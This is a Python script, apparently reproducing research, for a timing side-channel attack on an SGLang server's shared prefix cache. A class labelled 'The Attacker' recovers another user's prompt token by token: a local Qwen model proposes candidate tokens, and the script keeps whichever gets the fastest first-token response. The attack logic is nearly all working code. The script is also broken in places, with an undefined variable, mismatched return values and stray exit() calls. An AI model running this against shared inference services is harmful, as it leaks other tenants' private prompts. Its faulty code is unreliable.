import json
import time
import aiohttp
import asyncio
import random
from typing import Tuple, Dict, List, Any, Optional
from transformers import AutoModelForCausalLM, AutoTokenizer
import torch
from datasets import load_dataset
from itertools import islice

import aiohttp, json, time

import requests
def chunk_list(data, chunk_size):
    it = iter(data)
    while True:
        chunk = list(islice(it, chunk_size))
        if not chunk:
            break
        yield chunk
# --- Configuration Constants ---

async def stream_ttft(
    session: aiohttp.ClientSession,
    url: str,
    payload: dict,
):
    start = time.perf_counter()

    async with session.post(url, json=payload) as resp:
        if resp.status != 200:
            return {
                "status": f"HTTP_{resp.status}",
                "ttft": None,
                "token": None,
            }

        async for raw in resp.content:
            line = raw.decode("utf-8", errors="ignore").strip()
            if not line:
                continue

            # Handle SSE
            if line.startswith("data:"):
                line = line[5:].strip()

            if line == "[DONE]":
                break

            token = ""

            # Try JSON first
            try:
                obj = json.loads(line)

                # Most common SGLang / vLLM format
                if "text" in obj:
                    token = obj["text"]

                # OpenAI-style delta format (just in case)
                elif "choices" in obj:
                    delta = obj["choices"][0].get("delta", {})
                    token = delta.get("content", "")

            except json.JSONDecodeError:
                # Fallback: treat raw line as token
                token = line

            if token:
                ttft = time.perf_counter() - start
                return {
                    "status": "OK",
                    "ttft": ttft,
                    "token": token,
                }

    return {
        "status": "NO_TOKEN",
        "ttft": None,
        "token": None,
    }
# NOTE: This URL is used for context only; the actual network calls are mocked.
SGLANG_SERVICE_URL = "http://localhost:30000/generate"
# LOCAL_MODEL_PATH = "Qwen/Qwen2.5-1.5B-Instruct"
HF_TOKEN = ""
LOCAL_MODEL_PATH="chaejin98330/Qwen2.5-0.5B-Finetuned"
DATASET_NAME = "fka/awesome-chatgpt-prompts"

tokenizer = AutoTokenizer.from_pretrained(LOCAL_MODEL_PATH,
    token=HF_TOKEN)
model = AutoModelForCausalLM.from_pretrained(LOCAL_MODEL_PATH,
    token=HF_TOKEN)
# ====================================================================
# MOCK DEPENDENCIES (For Simulation)
# ====================================================================

class KV_Simulator:
    """
    Mocks the KV Cache and Longest Prefix Match (LPM) detection.
    This simulates the cache state of the SGlang service.
    """
    def __init__(self):
        self.cache: List[str] = []
        # Pre-populate with common prefixes for testing hits
        self.add_to_cache("The quick brown fox jumps over the lazy dog")
        self.add_to_cache("What are the steps involved in running a multi-tenant LLM service")
        self.add_to_cache("The best way to start a day is by getting up early")

    def add_to_cache(self, sequence: str):
        """Adds a sequence to the cache."""
        if sequence not in self.cache:
            self.cache.append(sequence)

    def get_lpm_score(self, sequence: str) -> int:
        """
        Calculates the Longest Prefix Match score (reused tokens).
        """
        max_match_len = 0
        # Normalize tokenization by splitting on space
        sequence_tokens = sequence.lower().split() 

        for cached_seq in self.cache:
            cached_tokens = cached_seq.lower().split()
            match_len = 0
            
            for i in range(min(len(sequence_tokens), len(cached_tokens))):
                if sequence_tokens[i] == cached_tokens[i]:
                    match_len += 1
                else:
                    break
            
            max_match_len = max(max_match_len, match_len)
            
        return max_match_len
def flush_cache():
    flushurl = f"http://localhost:30000/flush_cache"
    response=requests.post(flushurl)
    return

# ====================================================================
# INFERENCE CLIENT (The Attacker)
# ====================================================================

class InferenceClient:
    def __init__(self, url: str):
        self.url = url
        self.kv_simulator = KV_Simulator()
        self.LOCAL_MODEL_PATH = LOCAL_MODEL_PATH
        self.DATASET_NAME = DATASET_NAME
        
        # Simulated tokens derived from the Qwen model on the chat prompts dataset
        self.DRAFT_TOKENS = [" and", " the", " to", " is", " a", " of", " in", " that", 
                             " for", " by", " with", " it", " as", " be", " an", " me", " you", 
                             ".", ",", " what", " are", " steps", " to", " make", " best", " day"]


    # --- Component 1: Simulates the Local LLM Generating SINGLE-TOKEN Candidates ---
    def predict_next_token_local_llm(self, current_prefix: str, num_candidates: int) -> List[str]:
        """
        Generates a small list of likely next tokens, simulating the output
        of a Qwen model guided by the current prefix for context.
        
        NOTE: The following block shows the real 'transformers' implementation.
        Since it cannot be executed, a sophisticated mock is used below.
         """
        # input_ids = tokenizer.encode(current_prefix, return_tensors="pt")

        # with torch.no_grad():
        #     outputs = model.generate(
        #         input_ids,
        #         max_new_tokens=40,         # control sentence length
        #         num_return_sequences=1,
        #         do_sample=True,            # enables randomness
        #         top_k=50,
        #         top_p=0.9,
        #         temperature=1.0
        #     )

        # sentences = [
        #     tokenizer.decode(out[len(input_ids[0]):], skip_special_tokens=True).strip()
        #     for out in outputs
        # ]

        # return sentences
        # # --- Real Qwen Model Implementation Placeholder ---
        input_prompt = f"You are an LLM designed to predict the next sentence based on the previous context, predict the next token after input: '{current_prefix}'"
       
        
        try:
            # Assume tokenizer and model are loaded globally or cached:
            # from transformers import AutoTokenizer, AutoModelForCausalLM
            # import torch
            input_ids = tokenizer.encode(current_prefix, return_tensors="pt")
            with torch.no_grad():
                outputs = model(input_ids)
                next_token_logits = outputs.logits[:, -1, :]
                # Get top 'num_candidates' tokens
                top_k_indices = torch.topk(next_token_logits, num_candidates).indices.squeeze(0)
            
            candidates = [tokenizer.decode(idx.item()) for idx in top_k_indices]
          
            return candidates
            # pass 
        except Exception as e:
            import traceback 
            traceback.print_exc()
            print(f"Exception happened {e}, {current_prefix}")
            pass
        # ---------------------------------------------------
       
        # candidates = set()
        
        # # --- Sophisticated Mock Implementation ---
        # high_probability_tokens = []
        
        # # Heuristics based on the structure of the known victim prompt
        # if current_prefix.strip().endswith('considerations'):
        #     # This is the correct next token in the victim prompt
        #     high_probability_tokens = [" and", ", which", ", as", " to", " for"]
        # elif current_prefix.strip().endswith('and'):
        #     # This is the correct next token in the victim prompt
        #     high_probability_tokens = [" best", " worst", " good", " efficient", " all"]
        # elif current_prefix.strip().endswith('best'):
        #     high_probability_tokens = [" practices", " way", " method", " course"]
        
        # # 1. Add high probability tokens first (simulating the Qwen prediction)
        # for token in high_probability_tokens:
        #     if len(candidates) < num_candidates:
        #         candidates.add(token)

        # # 2. Fill the remaining spots with general draft tokens
        # while len(candidates) < num_candidates:
        #     candidates.add(random.choice(self.DRAFT_TOKENS))
            
        # return list(candidates)
    async def victim_simulation(self, input_sequences: str, max_tokens_to_recover: int, num_candidates: int = 10, track_kv: bool = False) -> Tuple[str, Dict]:
        """
        Iteratively recovers the victim's request one token at a time
        using the LPM side-channel[cite: 1905].
        """
        
        all_token_metrics = []
        
        # 3. Run parallel requests to find the maximum LPM hit
        async with aiohttp.ClientSession() as session:
            tasks = [self._send_token_peek_request_victim(session, seq, track_kv) for seq in input_sequences]
            results = await asyncio.gather(*tasks)
        return results    


    async def _send_token_peek_request_victim(self, session: aiohttp.ClientSession, full_sequence: str, track_kv: bool) -> Dict:
        """
        Simulates sending a real streaming request to the SGlang service 
        and extracting the latency/LPM metric from the first chunk.
        """
        
        # payload = {
        #     "model": "Qwen/Qwen2.5-1.5B-Instruct",
        #     "text": full_sequence, #[{"role": "user", "content": full_sequence}],
        #     "max_new_tokens": 1,
        #     "stream": True # Essential for per-token access
        # }

        payload = {
            "model": "Qwen/Qwen2.5-1.5B-Instruct",
            "text": full_sequence,
            "max_new_tokens": 10,  # Generate some tokens to ensure caching
            "stream": False,
            "ignore_eos": True  # If supported by your SGLang version
        }
        
        start_time = time.time()
        full_response_text = ""
        first_token_latency = None
        text_chunk_final = ""
      
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.url, json=payload) as response:
                    if response.status == 200:

                        # 2. Iterate over the response stream line by line
                        async for line in response.content:
                            line = line.decode('utf-8').strip()
                            # Skip empty keep-alive lines
                            if not line:
                                continue
                                
                            # Standard LLM streaming format usually starts with "data: "
                            if line.startswith("data:"):
                                data_str = line[5:].strip() # Remove "data: " prefix
                                
                                # Check for the stop signal (common in OpenAI-compatible APIs)
                                if data_str == "[DONE]":
                                    break
                                
                                try:
                                    chunk = json.loads(data_str)
                                    
                                    # Extract text based on standard API formats
                                    # Adjust key access depending on your specific SGLang endpoint version
                                    text_chunk = chunk.get("text", "") 
                                    
                                    if text_chunk:
                                        first_token_latency = time.time() - start_time
                                        text_chunk_final += text_chunk
                                        
                                    if text_chunk:
                                        # Record Time to First Token (TTFT)
                                        if first_token_latency is None:
                                            first_token_latency = time.time() - start_time
                                            
                                        full_response_text += text_chunk
                                        
                                except json.JSONDecodeError:
                                    continue

                        total_latency = time.time() - start_time
                        
                        # 3. Simulate KV cache update (done after full response is received)
               
                        lpm_score = 0

                        return text_chunk_final, total_latency
                    else:
                        return f"ERROR_{response.status}", time.time() - start_time, {}
                        
        except Exception as e:
            return f"ERROR_{str(e)}", time.time() - start_time, {}

    # --- Component 2: Side-Channel Simulation via Real Streaming Request ---
    async def _send_token_peek_request(self, session: aiohttp.ClientSession, full_sequence: str, track_kv: bool) -> Dict:
        """
        Simulates sending a real streaming request to the SGlang service 
        and extracting the latency/LPM metric from the first chunk.
        """
        
        payload = {
            "model": "Qwen/Qwen3-0.6B-FP8",
            "text": full_sequence, #[{"role": "user", "content": full_sequence}],
            "max_new_tokens": 1,
            "stream": True # Essential for per-token access
        }
        
        start_time = time.time()
        full_response_text = ""
        first_token_latency = None
        text_chunk_final = ""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.url, json=payload) as response:
                    if response.status == 200:
                        # 2. Iterate over the response stream line by line
                        async for line in response.content:
                            line = line.decode('utf-8').strip()
                            # Skip empty keep-alive lines
                            if not line:
                                continue
                                
                            # Standard LLM streaming format usually starts with "data: "
                            if line.startswith("data:"):
                                data_str = line[5:].strip() # Remove "data: " prefix
                                
                                # Check for the stop signal (common in OpenAI-compatible APIs)
                                if data_str == "[DONE]":
                                    break
                                
                                try:
                                    chunk = json.loads(data_str)
                                    
                                    # Extract text based on standard API formats
                                    # Adjust key access depending on your specific SGLang endpoint version
                                    text_chunk = chunk.get("text", "") 
                                    
                                    if text_chunk:
                                        first_token_latency = time.time() - start_time
                                        text_chunk_final = text_chunk
                                        # return text_chunk, first_token_latency, {}  
                                        return {
                                            "recovered_token": text_chunk, 
                                            "latency": first_token_latency, 
                                            "status": "OK"
                                        }
                                    if text_chunk:
                                        # Record Time to First Token (TTFT)
                                        if first_token_latency is None:
                                            first_token_latency = time.time() - start_time
                                            
                                        full_response_text += text_chunk
                                        
                                except json.JSONDecodeError:
                                    continue

                        total_latency = time.time() - start_time
                        
                        # 3. Simulate KV cache update (done after full response is received)
                        if track_kv:
                            self.kv_simulator.add_to_cache(prompt)
                            lpm_score = self.kv_simulator.get_lpm_score(prompt)
                        else:
                            lpm_score = 0

                        return full_response_text, total_latency, {
                            'prompt': prompt,
                            'kv_hit': lpm_score > 0,
                            'lpm_score': lpm_score,
                            'timestamp': start_time,
                            'ttft': first_token_latency # Added metric for streaming
                        }
                    else:
                        return f"ERROR_{response.status}", time.time() - start_time, {}
                        
        except Exception as e:
            return f"ERROR_{str(e)}", time.time() - start_time, {}

        # --- MOCKING THE NETWORK CALL AND LPM METRICS ---
        # This section replaces the real network request for a functional simulation.
        
        token_count = len(full_sequence.split())
        
        lpm_score = 0
        latency = float('inf')
        
        if track_kv:
            # 1. LPM Score: Calculated from the shared cache
            lpm_score = self.kv_simulator.get_lpm_score(full_sequence)
            
            # 2. Latency Side-Channel: Higher LPM score means lower latency
            # Latency = (Base Cost per token) + (Random Noise) - (Cache Savings)
            # This models the faster serving time due to cache reuse [cite: 1899]
            latency = (token_count * 0.005) + (random.random() * 0.05) - (lpm_score * 0.002)
            latency = max(0.01, latency) # Ensure non-negative latency
            
            # 3. Cache Update (The Attacker's footprint)
            self.kv_simulator.add_to_cache(full_sequence)
        else:
            latency = (token_count * 0.005) + (random.random() * 0.05)
            
        # --- END MOCKING ---

        return {
            'candidate': full_sequence,
            'latency': latency,
            'lpm_score': lpm_score,
            'kv_hit': lpm_score > 0,
            'status': 'OK'
        }


    # --- Main Attack Function: Iterative Token Recovery ---
    async def recover_victim_request_iterative(self, known_prefix: str, max_tokens_to_recover: int, num_candidates: int = 10, track_kv: bool = False, next_token = "") -> Tuple[str, Dict]:
        """
        Iteratively recovers the victim's request one token at a time
        using the LPM side-channel[cite: 1905].
        """
        
        recovered_request = known_prefix
        all_token_metrics = []
        
        print(f"Starting Iterative Recovery with prefix: '{known_prefix}'")
        
        for i in range(max_tokens_to_recover):
        
            # 1. Generate single-token candidates from local LLM
     
            candidate_tokens = self.predict_next_token_local_llm(current_prefix=recovered_request, num_candidates=num_candidates)
            print("candidate tokens are ", candidate_tokens)
            # 2. Create the full sequence for peeking
            
            # peek_sequences = [recovered_request + token for token in candidate_tokens]
          
            # # 3. Run parallel requests to find the maximum LPM hit
            # async with aiohttp.ClientSession() as session:
            #     tasks = [self._send_token_peek_request(session, seq, track_kv) for seq in peek_sequences]
            #     results = await asyncio.gather(*tasks)

            peek_sequences = [recovered_request + token for token in candidate_tokens]
            # print("Peak sequences are ", peek_sequences)
            results = []
            CONCURRENCY = 90
            NUM_CYCLES = 1
            for request_cycle in range(NUM_CYCLES):
                # async with aiohttp.ClientSession() as session:
                #     for seq_batch in chunk_list(peek_sequences, CONCURRENCY):
                #         tasks = [self._send_token_peek_request(session, seq, track_kv) 
                #                 for seq in seq_batch]
                #         batch_results = await asyncio.gather(*tasks, return_exceptions=True)
                #         results.append(batch_results)

       
                async with aiohttp.ClientSession() as session:
                    # for seq_batch in chunk_list(peek_sequences, CONCURRENCY)
                        for seq in peek_sequences:
                            payload = {"model": "Qwen/Qwen3-0.6B-FP8", "text": seq, "max_new_tokens": 1, "stream": True}
                            out = await stream_ttft(session, SGLANG_SERVICE_URL, payload)
                            results.append(out)
                            # exit()
                            
            averaged_results = []

            for token_index, result in enumerate(results):
                
                averaged_results.append({
                    "token_index": token_index,
                    "token": candidate_tokens[token_index],
                    "latency": result["ttft"],
                    # "num_samples": len(latencies),
                    "status":"OK"
                })
            # NUM_CYCLES = len(results)
            # NUM_TOKENS = len(results[0])     # number of candidate tokens

            # # initialize output
            # for token_index in range(NUM_TOKENS):
            #     latencies = []
            #     for cycle in range(NUM_CYCLES):
            #         r = results[cycle][token_index]
            #         if isinstance(r, dict) and "latency" in r:
            #             latencies.append(r["latency"])

            #     # compute average for this token
            #     if latencies:
            #         avg_latency = sum(latencies) / len(latencies)
            #     else:
            #         avg_latency = None

            #     # build final combined result for this token
            #     averaged_results.append({
            #         "token_index": token_index,
            #         "token": candidate_tokens[token_index],
            #         "latency": avg_latency,
            #         "num_samples": len(latencies),
            #         "status":"OK"
            #     })

            # print("Final averaged results:")
            # for x in averaged_results:
            #     print(x)
           
                        # 4. Analyze Results and Select Best Candidate
            best_candidate_data: Dict[str, Any] = {'latency': float('inf'), 'candidate': None}
            
            # The logic prioritizes the highest LPM score (strongest cache hit),
            # then the lowest latency (fastest response time).
            print(f"Processing the recovered token for {recovered_request}")
         
            for result in averaged_results:
                try: 
                    print(f"Current request is {candidate_tokens[result['token_index']]} latency {result['latency']}")
                    
                    if result['status'] != 'OK':
                        continue
                    is_better = False
                  
                    # Primary Criterion: Higher LPM score is always better
                    # if result['lpm_score'] > best_candidate_data['lpm_score']:
                    #     is_better = True
                    
                    # Secondary Criterion (Tie-breaker): If scores are equal, lower latency is better
                    # elif result['lpm_score'] == best_candidate_data['lpm_score']:
                    if result['latency'] < best_candidate_data['latency']:
                        is_better = True


                    if is_better:
                        best_candidate_data["candidate"] = candidate_tokens[result['token_index']] #result["recovered_token"]
                        best_candidate_data["latency"] = result["latency"]

                except Exception as e:
                    import traceback 
                    traceback.print_exc()
                    print(f"Exception {e} occurred for {result} {best_candidate_data['candidate']}")
            
            # 5. Extract and Append the recovered token
            if best_candidate_data['candidate'] is not None:
                # Calculate the expected LPM score if the previous token was a hit
                expected_lpm_for_hit = len(recovered_request.split()) + 1
                
                # The recovered token is the part of the candidate that extends the current recovered request
                recovered_token = best_candidate_data['candidate']
                recovered_request += recovered_token
                all_token_metrics.append({
                    'step': i + 1,
                    'recovered_token': recovered_token,
                    'latency': best_candidate_data['latency'], 
                  
                })
                print(f"Step {i+1}: Recovered token: '{recovered_token.strip()}' | Current Request: '{recovered_request}'")
                exit()
            else:
                print(f"Step {i+1}: Failed to find a valid continuation. Ending recovery.")
                break

        return recovered_request, {
            'final_length': len(recovered_request.split()),
            'token_metrics': all_token_metrics,
            'total_tokens_recovered': len(all_token_metrics)
        }


# ====================================================================
# EXAMPLE USAGE
# ====================================================================

async def main():
    client = InferenceClient(url=SGLANG_SERVICE_URL)
    
    
    DATASET_NAME = "fka/awesome-chatgpt-prompts"

    # Load ALL splits (this dataset has only "train")
    dataset = load_dataset(DATASET_NAME)
    for item in dataset["train"]:
        
            
        # --- 1. VICTIM CACHE INJECTION (Simulating the victim running their request) ---
        victim_request = item["prompt"]

        
        # The victim's full request is stored in the cache (LPM tree)[cite: 1895, 1982].
        print(f"--- VICTIM CACHE INJECTION ---")
        # client.kv_simulator.add_to_cache(victim_request)
        # flush_cache()
        # for i in range(20):
        # Recover up to 10 additional tokens
        recovered_request = await client.victim_simulation(
            input_sequences=victim_request, 
            max_tokens_to_recover=10, 
            num_candidates=15, 
            track_kv=True # Enable the LPM side-channel logic
        )


        print(f"Victim's full request added to cache: '{victim_request}'")
        # print(f"Victim's response request added to cache: '{recovered_request[0][:30]}'")
        print(f"Cache size: {len(client.kv_simulator.cache)} entries.\n")

        # --- 2. ATTACKER PROMPT RECOVERY ---
        # The attacker knows a partial prefix (e.g., from network logs or template knowledge)
            

        words_to_recover = len(victim_request.split())
        print(f"--- ATTACKER PROMPT RECOVERY AGAINST SGLANG ({SGLANG_SERVICE_URL}), max tokens to recover {words_to_recover} ---")
        known_prefix = " ".join(victim_request.split(".")[0].split()[:3])
        next_token = " ".join(victim_request.split(".")[0].split()[4])
       
        # Recover up to 10 additional tokens
        recovered_request, metrics = await client.recover_victim_request_iterative(
            known_prefix=known_prefix, 
            max_tokens_to_recover=words_to_recover, 
            num_candidates=10, 
            track_kv=True,  # Enable the LPM side-channel logic, 
            next_token = next_token
        )
        print(recovered_request)
        exit()
        
        print("\n--- Summary of Attack Outcome ---")
        print(f"Victim Request (Target): '{victim_request}'")
        print(f"Recovered Request:       '{recovered_request}'")
        
        match_status = "SUCCESS" if recovered_request.startswith(victim_request) or victim_request.startswith(recovered_request) else "PARTIAL MATCH"
        
        print(f"Recovery Status: {match_status}")
        print(f"Tokens Recovered: {metrics['total_tokens_recovered']}")
        
        print("\n--- Token-by-Token Metrics ---")
        for step in metrics['token_metrics']:
            print(f"Step {step['step']}: Token='{step['recovered_token'].strip()}' | Latency={step['latency']:.4f}s")
        exit()
if __name__ == "__main__":
    try:
        # Using a higher-level asyncio.run wrapper if available
        # On some environments, this might require a different approach for execution.
        asyncio.run(main())
    except KeyboardInterrupt:
        pass